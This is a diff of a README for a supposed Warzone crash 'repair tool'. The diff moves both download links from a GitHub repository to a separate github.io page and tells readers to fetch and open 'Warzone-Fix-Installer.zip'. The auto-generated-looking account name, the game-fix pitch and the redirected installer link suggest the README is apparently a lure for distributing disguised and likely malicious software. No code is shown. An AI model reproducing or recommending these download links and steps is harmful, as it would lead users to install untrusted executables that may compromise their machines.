@@ -1,6 +1,6 @@
 # 🛠️ Warzone-Dev-Error-Fix - Reliable Fixes For Your Warzone Crashes
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/thorntipped-encyclopedist175/Warzone-Dev-Error-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://thorntipped-encyclopedist175.github.io)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 You need to access the official release page to get the software. Follow this link to the download section:
 
-[Click Here To Download The Repair Tool](https://github.com/thorntipped-encyclopedist175/Warzone-Dev-Error-Fix)
+[Click Here To Download The Repair Tool](https://thorntipped-encyclopedist175.github.io)
 
 Once you reach the page, look for the file named "Warzone-Fix-Installer.zip." Click the link to save the file to your computer.
 
